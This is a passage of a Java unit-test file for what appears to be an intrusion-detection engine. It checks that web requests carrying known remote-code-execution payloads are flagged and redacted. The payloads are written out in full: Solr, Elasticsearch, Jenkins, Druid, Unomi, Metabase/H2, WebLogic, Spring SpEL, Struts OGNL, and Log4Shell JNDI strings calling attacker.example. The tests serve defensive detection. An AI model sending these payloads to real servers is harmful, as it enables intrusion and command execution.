    assertEquals("spel", result.orElseThrow().details().get("engine"));
  }

  @Test
  void detectsSolrCve20190193DataImportDynamicScriptConfig() {
    var dataConfig =
        """
        <dataConfig>
          <script><![CDATA[
            function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/success"); }
          ]]></script>
          <document><entity name="sample" transformer="script:poc"/></document>
        </dataConfig>
        """;
    var context =
        new RequestContext(
            "POST",
            "/solr/demo/dataimport",
            "command=full-import",
            Map.of("command", List.of("full-import"), "dataConfig", List.of(dataConfig)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("dataConfig", result.orElseThrow().details().get("parameter"));
    assertEquals("javascript", result.orElseThrow().details().get("engine"));
  }

  @Test
  void detectsElasticsearchCve20143120MvelSearchScriptField() {
    var script =
        "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\")"
            + ".getInputStream()).useDelimiter(\"\\\\A\").next();";
    var body =
        """
        {"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"command":{"script":"%s"}}}
        """
            .formatted(jsonString(script));
    var context =
        new RequestContext(
            "POST",
            "/_search",
            "pretty",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.script", result.orElseThrow().details().get("parameter"));
    assertEquals("mvel", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(script.length()), result.orElseThrow().details().get("sourceLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void detectsElasticsearchCve20151427GroovySearchScriptField() {
    var script =
        "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()";
    var body =
        "{\"size\":1,\"script_fields\":{\"lupin\":{\"lang\":\"groovy\",\"script\":\""
            + jsonString(script)
            + "\"}}}";
    var context =
        new RequestContext(
            "POST",
            "/_search",
            "pretty",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/text"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.script", result.orElseThrow().details().get("parameter"));
    assertEquals("groovy", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(script.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void ignoresBenignElasticsearchGroovySearchScriptField() {
    var script = "doc['name'].value";
    var body =
        "{\"size\":1,\"script_fields\":{\"name\":{\"lang\":\"groovy\",\"script\":\""
            + jsonString(script)
            + "\"}}}";
    var context =
        new RequestContext(
            "POST",
            "/_search",
            "pretty",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/text"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsHugeGraphGremlinReflectiveProcessBuilderDynamicScriptConfig() {
    var script = hugeGraphGremlinScript();
    var body =
        """
        {"gremlin":"%s","bindings":{},"language":"gremlin-groovy","aliases":{}}
        """
            .formatted(jsonString(script));
    var context =
        new RequestContext(
            "POST",
            "/gremlin",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.gremlin", result.orElseThrow().details().get("parameter"));
    assertEquals("groovy", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(script.length()), result.orElseThrow().details().get("sourceLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void ignoresBenignHugeGraphGremlinTraversalDynamicScriptConfig() {
    var body =
        """
        {"gremlin":"g.V().hasLabel('person').limit(10)","bindings":{},"language":"gremlin-groovy","aliases":{}}
        """;
    var context =
        new RequestContext(
            "POST",
            "/gremlin",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsJenkinsGroovyCheckScriptDynamicScriptConfig() {
    var script = "public class x { public x(){ \"touch /tmp/success\".execute() } }";
    var context =
        new RequestContext(
            "GET",
            "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript",
            "sandbox=true&value=" + script,
            Map.of("sandbox", List.of("true"), "value", List.of(script)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("value", result.orElseThrow().details().get("parameter"));
    assertEquals("groovy", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(script.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("value"));
    assertEquals("sandbox=true&value=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void detectsOfbizProgramExportUnicodeGroovyDynamicScriptConfig() {
    var script = "throw new Exception('id'.\\u0065xecute().text);";
    var decodedScript = "throw new Exception('id'.execute().text);";
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/main/ProgramExport",
            "groovyProgram=throw+new+Exception('id'.%5Cu0065xecute().text)%3B",
            Map.of("groovyProgram", List.of(script)),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("groovyProgram", result.orElseThrow().details().get("parameter"));
    assertEquals("groovy", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(decodedScript.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(
        List.of("[redacted]"), result.orElseThrow().request().parameters().get("groovyProgram"));
    assertEquals("groovyProgram=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void ignoresBenignOfbizProgramExportGroovyDynamicScriptConfig() {
    var script = "return 'hello'.toUpperCase();";
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/main/ProgramExport",
            "groovyProgram=return+'hello'.toUpperCase()%3B",
            Map.of("groovyProgram", List.of(script)),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignJenkinsGroovyCheckScriptDynamicScriptConfig() {
    var script = "public class x { String ok(){ return \"hello\".toUpperCase() } }";
    var context =
        new RequestContext(
            "GET",
            "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript",
            "sandbox=true&value=" + script,
            Map.of("sandbox", List.of("true"), "value", List.of(script)),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresGroovyExecuteOutsideDynamicScriptConfigContext() {
    var script = "public class x { public x(){ \"touch /tmp/success\".execute() } }";
    var context =
        new RequestContext(
            "POST",
            "/api/comments",
            "value=" + script,
            Map.of("value", List.of(script)),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsAjReportValidationRulesBodyDynamicScriptConfig() {
    var script =
        "function verification(data){a = new java.lang.ProcessBuilder(\"id\")"
            + ".start().getInputStream();return a;}";
    var body =
        "{\"ParamName\":\"\",\"sampleItem\":\"1\",\"validationRules\":\"" + jsonString(script) + "\"}";
    var context =
        new RequestContext(
            "POST",
            "/dataSetParam/verification;swagger-ui/",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json;charset=UTF-8"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.validationRules", result.orElseThrow().details().get("parameter"));
    assertEquals("javascript", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(script.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void detectsDruidSamplerJavascriptFunctionBodyDynamicScriptConfig() {
    var script =
        "function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime()"
            + ".exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\\\A\").next();"
            + "return {timestamp:123123,test:a}}";
    var body =
        """
        {
          "type": "index",
          "spec": {
            "dataSchema": {
              "parser": {
                "parseSpec": {
                  "format": "javascript",
                  "function": "%s",
                  "": {"enabled": "true"}
                }
              }
            }
          }
        }
        """
            .formatted(jsonString(script));
    var context =
        new RequestContext(
            "POST",
            "/druid/indexer/v1/sampler",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.function", result.orElseThrow().details().get("parameter"));
    assertEquals("javascript", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(script.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void detectsUnomiMvelContextJsonDynamicScriptConfig() {
    var script = "script::Runtime r = Runtime.getRuntime(); r.exec(\"touch /tmp/mvel\");";
    var body =
        """
        {
          "filters": [{
            "id": "sample",
            "filters": [{
              "condition": {
                "parameterValues": {
                  "": "%s"
                },
                "type": "profilePropertyCondition"
              }
            }]
          }],
          "sessionId": "sample"
        }
        """
            .formatted(jsonString(script));
    var context =
        new RequestContext(
            "POST",
            "/context.json",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.<unnamed>", result.orElseThrow().details().get("parameter"));
    assertEquals("mvel", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(script.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void detectsUnomiOgnlContextJsonDynamicScriptConfig() {
    var expression =
        "(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\"))"
            + ".(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0])"
            + ".(#rtobj = #getruntimemethod.invoke(null,null))"
            + ".(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}[0])"
            + ".(#execmethod.invoke(#rtobj,\"touch /tmp/ognl\"))";
    var body =
        """
        {
          "personalizations": [{
            "contents": [{
              "filters": [{
                "condition": {
                  "parameterValues": {
                    "propertyName": "%s",
                    "comparisonOperator": "equals",
                    "propertyValue": "male"
                  },
                  "type": "profilePropertyCondition"
                }
              }]
            }]
          }],
          "sessionId": "sample"
        }
        """
            .formatted(jsonString(expression));
    var context =
        new RequestContext(
            "POST",
            "/context.json",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.propertyName", result.orElseThrow().details().get("parameter"));
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void detectsMetabaseH2InitJsonDynamicScriptConfig() {
    var init =
        "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n"
            + "java.lang.Runtime.getRuntime().exec('touch /tmp/success')\n$$";
    var body =
        """
        {
          "token": "setup-token",
          "details": {
            "details": {
              "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
              "init": "%s"
            },
            "engine": "h2"
          }
        }
        """
            .formatted(jsonString(init).replace("\n", "\\n"));
    var context =
        new RequestContext(
            "POST",
            "/api/setup/validate",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.init", result.orElseThrow().details().get("parameter"));
    assertEquals("javascript", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(init.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void ignoresBenignMetabaseH2InitJsonDynamicScriptConfig() {
    var body =
        """
        {
          "token": "setup-token",
          "details": {
            "details": {
              "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
              "init": "SET MODE MSSQLServer"
            },
            "engine": "h2"
          }
        }
        """;
    var context =
        new RequestContext(
            "POST",
            "/api/setup/validate",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresMetabaseInitJsonOutsideSetupValidationPath() {
    var init =
        "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n"
            + "java.lang.Runtime.getRuntime().exec('touch /tmp/success')\n$$";
    var body =
        """
        {"init":"%s"}
        """
            .formatted(jsonString(init).replace("\n", "\\n"));
    var context =
        new RequestContext(
            "POST",
            "/api/comments",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsH2ConsoleJdbcInitUrlDynamicScriptConfig() {
    var jdbcUrl =
        "jdbc:h2:mem:test;MODE=MSSQLServer;FORBID_CREATION=FALSE;"
            + "INIT=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n"
            + "java.lang.Runtime.getRuntime().exec(\"id\")\n$$;AUTHZPWD=\\";
    var context =
        new RequestContext(
            "POST",
            "/h2-console/login.do",
            "driver=org.h2.Driver&url=" + jdbcUrl,
            Map.of("driver", List.of("org.h2.Driver"), "url", List.of(jdbcUrl)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("url", result.orElseThrow().details().get("parameter"));
    assertEquals("h2", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(jdbcUrl.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("url"));
    assertTrue(result.orElseThrow().request().query().contains("url=[redacted]"));
  }

  @Test
  void ignoresBenignH2ConsoleJdbcUrl() {
    var context =
        new RequestContext(
            "POST",
            "/h2-console/login.do",
            "driver=org.h2.Driver&url=jdbc%3Ah2%3Amem%3Atest",
            Map.of("driver", List.of("org.h2.Driver"), "url", List.of("jdbc:h2:mem:test")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsWebLogicConsoleShellSessionHandleDynamicScriptConfig() {
    var handle =
        "com.tangosol.coherence.mvel2.sh.ShellSession("
            + "\"java.lang.Runtime.getRuntime().exec('touch /tmp/success1');\")";
    var context =
        new RequestContext(
            "GET",
            "/console/css/console.portal",
            "_nfpb=true&_pageLabel=&handle=" + handle,
            Map.of("_nfpb", List.of("true"), "_pageLabel", List.of(""), "handle", List.of(handle)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("handle", result.orElseThrow().details().get("parameter"));
    assertEquals("mvel", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(handle.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("handle"));
    assertTrue(result.orElseThrow().request().query().contains("handle=[redacted]"));
  }

  @Test
  void detectsWebLogicConsoleRemoteSpringHandleDynamicScriptConfig() {
    var handle =
        "com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext"
            + "(\"http://example.com/rce.xml\")";
    var context =
        new RequestContext(
            "GET",
            "/console/css/console.portal",
            "_nfpb=true&_pageLabel=&handle=" + handle,
            Map.of("_nfpb", List.of("true"), "_pageLabel", List.of(""), "handle", List.of(handle)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("handle", result.orElseThrow().details().get("parameter"));
    assertEquals("spring", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(handle.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("handle"));
    assertTrue(result.orElseThrow().request().query().contains("handle=[redacted]"));
  }

  @Test
  void ignoresBenignWebLogicConsoleHandle() {
    var handle = "com.example.console.HelpPage(\"welcome\")";
    var context =
        new RequestContext(
            "GET",
            "/console/css/console.portal",
            "_nfpb=true&_pageLabel=&handle=" + handle,
            Map.of("_nfpb", List.of("true"), "_pageLabel", List.of(""), "handle", List.of(handle)),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsDataEaseBase64H2DatasourceConfigDynamicScriptConfig() {
    var configuration = dataEaseH2Configuration();
    var encoded = Base64.getEncoder().encodeToString(configuration.getBytes(StandardCharsets.UTF_8));
    var body = "{\"name\":\"p1\",\"type\":\"h2\",\"configuration\":\"" + encoded + "\"}";
    var context =
        new RequestContext(
            "POST",
            "/de2api/datasource/validate",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.configuration", result.orElseThrow().details().get("parameter"));
    assertEquals("h2", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(configuration.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void detectsDataEaseBase64H2DatasourceConfigParameterAndRedactsIt() {
    var configuration = dataEaseH2Configuration();
    var encoded = Base64.getEncoder().encodeToString(configuration.getBytes(StandardCharsets.UTF_8));
    var context =
        new RequestContext(
            "POST",
            "/de2api/datasource/validate",
            "configuration=" + encoded,
            Map.of("configuration", List.of(encoded)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("configuration", result.orElseThrow().details().get("parameter"));
    assertEquals("h2", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(configuration.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(
        List.of("[redacted]"), result.orElseThrow().request().parameters().get("configuration"));
    assertEquals("configuration=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void ignoresBenignDataEaseBase64H2DatasourceConfig() {
    var configuration =
        "{\"jdbc\":\"jdbc:h2:mem:pwn;MODE=MSSQLServer\",\"username\":\"\",\"password\":\"\","
            + "\"driver\":\"org.h2.Driver\"}";
    var encoded = Base64.getEncoder().encodeToString(configuration.getBytes(StandardCharsets.UTF_8));
    var body = "{\"name\":\"p1\",\"type\":\"h2\",\"configuration\":\"" + encoded + "\"}";
    var context =
        new RequestContext(
            "POST",
            "/de2api/datasource/validate",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresDataEaseBase64H2DatasourceConfigOutsideValidationPath() {
    var configuration = dataEaseH2Configuration();
    var encoded = Base64.getEncoder().encodeToString(configuration.getBytes(StandardCharsets.UTF_8));
    var body = "{\"configuration\":\"" + encoded + "\"}";
    var context =
        new RequestContext(
            "POST",
            "/api/comments",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsDruidSamplerJavascriptRuntimeConfig() {
    var function =
        "function(){return java.lang.Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\"id\"});}";
    var body =
        """
        {
          "type": "index",
          "spec": {
            "dataSchema": {
              "parser": {
                "parseSpec": {
                  "format": "javascript",
                  "function": "%s",
                  "": {"enabled": "true"}
                }
              }
            }
          },
          "samplerConfig": {"numRows": 10}
        }
        """
            .formatted(jsonString(function));
    var context =
        new RequestContext(
            "POST",
            "/druid/indexer/v1/sampler",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.function", result.orElseThrow().details().get("parameter"));
    assertEquals("javascript", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(function.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void ignoresBenignDynamicScriptBody() {
    var body =
        """
        {"type":"index","spec":{"dataSchema":{"parser":{"parseSpec":{
          "format":"javascript",
          "function":"function(row){ return {timestamp: row.time, value: row.value}; }"
        }}}}}
        """;
    var context =
        new RequestContext(
            "POST",
            "/druid/indexer/v1/sampler",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignUnomiContextJsonBody() {
    var body =
        """
        {
          "filters": [{
            "id": "sample",
            "filters": [{
              "condition": {
                "parameterValues": {
                  "propertyName": "profile.gender",
                  "comparisonOperator": "equals",
                  "propertyValue": "male"
                },
                "type": "profilePropertyCondition"
              }
            }]
          }],
          "sessionId": "sample"
        }
        """;
    var context =
        new RequestContext(
            "POST",
            "/context.json",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresRuntimeTextInJsonBodyOutsideDynamicConfigShape() {
    var context =
        new RequestContext(
            "POST",
            "/api/comments",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            "{\"message\":\"java.lang.Runtime.getRuntime().exec('id')\"}");

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsSpringMessagingStompSelectorExpression() {
    var selector = "T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')";
    var body =
        "[\"SUBSCRIBE\\nid:sub-0\\ndestination:/topic/greetings\\nselector:"
            + selector
            + "\\n\\n\\u0000\"]";
    var context =
        new RequestContext(
            "POST",
            "/gs-guide-websocket/123/abc/xhr_send",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_message_selector_expression");
    assertEquals("spel", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(selector.length()), result.orElseThrow().details().get("selectorLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void ignoresBenignStompSelectorExpression() {
    var body =
        "[\"SUBSCRIBE\\nid:sub-0\\ndestination:/topic/greetings"
            + "\\nselector:headers['tenant'] == 'acme'\\n\\n\\u0000\"]";
    var context =
        new RequestContext(
            "POST",
            "/gs-guide-websocket/123/abc/xhr_send",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsRuntimeExpressionHeader() {
    var expression = "T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/success\")";
    var context =
        new RequestContext(
            "POST",
            "/functionRouter",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "spring.cloud.function.routing-expression",
                expression));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_header");
    assertEquals(
        "spring.cloud.function.routing-expression", result.orElseThrow().details().get("header"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(
        "[redacted]",
        result.orElseThrow().request().headers().get("spring.cloud.function.routing-expression"));
  }

  @Test
  void detectsSpringCve202222963FunctionRouterRoutingExpressionHeader() {
    var expression = "T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/success\")";
    var context =
        new RequestContext(
            "POST",
            "/functionRouter",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "content-type",
                "text/plain",
                "spring.cloud.function.routing-expression",
                expression),
            "test");

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_header");
    assertEquals(
        "spring.cloud.function.routing-expression", result.orElseThrow().details().get("header"));
    assertEquals("[redacted]", result.orElseThrow().request().headers().get("spring.cloud.function.routing-expression"));
  }

  @Test
  void detectsOgnlContentTypeExpressionHeader() {
    var expression =
        "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
            + ".addHeader('vulhub',233*233)}.multipart/form-data";
    var context =
        new RequestContext(
            "POST",
            "/",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", expression));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_header");
    assertEquals("content-type", result.orElseThrow().details().get("header"));
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals("[redacted]", result.orElseThrow().request().headers().get("content-type"));
  }

  @Test
  void ignoresBenignExpressionHeader() {
    var context =
        new RequestContext(
            "POST",
            "/functionRouter",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "spring.cloud.function.routing-expression",
                "headers['route'] ?: 'uppercase'"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignParserAndNonParserExpressionHeaders() {
    var contentTypeContext =
        new RequestContext(
            "POST",
            "/upload",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "content-type",
                "multipart/form-data; boundary=----WebKitFormBoundary"));
    var displayHeaderContext =
        new RequestContext(
            "GET",
            "/profile",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "x-note", "%{profile.displayName}"));

    assertTrue(engine.detectRequest(contentTypeContext).isEmpty());
    assertTrue(engine.detectRequest(displayHeaderContext).isEmpty());
  }

  @Test
  void detectsRequestJndiLookupParameter() {
    var payload = "${jndi:ldap://${sys:java.version}.example.com}";
    var context =
        new RequestContext(
            "GET",
            "/solr/admin/cores",
            "action=" + payload,
            Map.of("action", List.of(payload)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_jndi_lookup");
    assertEquals("parameter", result.orElseThrow().details().get("source"));
    assertEquals("action", result.orElseThrow().details().get("name"));
    assertEquals("ldap", result.orElseThrow().details().get("protocol"));
    assertEquals(
        String.valueOf(payload.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("action"));
    assertEquals("action=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void detectsObfuscatedRequestJndiLookupHeader() {
    var payload = "${${::-j}${::-n}${::-d}${::-i}:rmi://attacker.example/a}";
    var context =
        new RequestContext(
            "GET",
            "/",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "x-api-version", payload));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_jndi_lookup");
    assertEquals("header", result.orElseThrow().details().get("source"));
    assertEquals("x-api-version", result.orElseThrow().details().get("name"));
    assertEquals("rmi", result.orElseThrow().details().get("protocol"));
    assertEquals("[redacted]", result.orElseThrow().request().headers().get("x-api-version"));
  }

  @Test
  void detectsH2ConsoleJndiDriverUrlConfiguration() {
    var jndiUrl = "ldap://attacker.example/Exploit";
    var context =
        new RequestContext(
            "POST",
            "/h2-console/login.do",
            "driver=javax.naming.InitialContext&url=ldap%3A%2F%2Fattacker.example%2FExploit",
            Map.of(
                "driver",
                List.of("javax.naming.InitialContext"),
                "url",
                List.of(jndiUrl)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_jndi_lookup");
    assertEquals("parameter", result.orElseThrow().details().get("source"));
    assertEquals("url", result.orElseThrow().details().get("name"));
    assertEquals("ldap", result.orElseThrow().details().get("protocol"));
    assertEquals(String.valueOf(jndiUrl.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("url"));
    assertEquals(
        "driver=javax.naming.InitialContext&url=[redacted]",
        result.orElseThrow().request().query());
  }

  @Test
  void ignoresBenignLookupAndRawLdapText() {
    var context =
        new RequestContext(
            "GET",
            "/solr/admin/cores",
            "action=${date:yyyy}&next=ldap://example.com/a",
            Map.of(
                "action",
                List.of("${date:yyyy}"),
                "next",
                List.of("ldap://example.com/a")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresRawLdapUrlWithOrdinaryJdbcDriver() {
    var context =
        new RequestContext(
            "POST",
            "/h2-console/login.do",
            "driver=org.h2.Driver&url=ldap%3A%2F%2Fexample.com%2Fnot-jndi",
            Map.of(
                "driver",
                List.of("org.h2.Driver"),
                "url",
                List.of("ldap://example.com/not-jndi")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsRequestExpressionParameter() {
    var expression =
        "(#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,"
            + "#_memberAccess[\"allowStaticMethodAccess\"]=true,"
            + "@java.lang.Runtime@getRuntime().exec('id'))(meh)";
    var context =
        new RequestContext(
            "GET",
            "/ajax/example5.action",
            "age=1&name=" + expression,
            Map.of("age", List.of("1"), "name", List.of(expression)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("name", result.orElseThrow().details().get("parameter"));
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("name"));
    assertTrue(result.orElseThrow().request().query().contains("name=[redacted]"));
  }

  @Test
  void detectsGeoServerCve202436401WfsValueReferenceExpressionParameter() {
    var expression = "exec(java.lang.Runtime.getRuntime(),'touch /tmp/success1')";
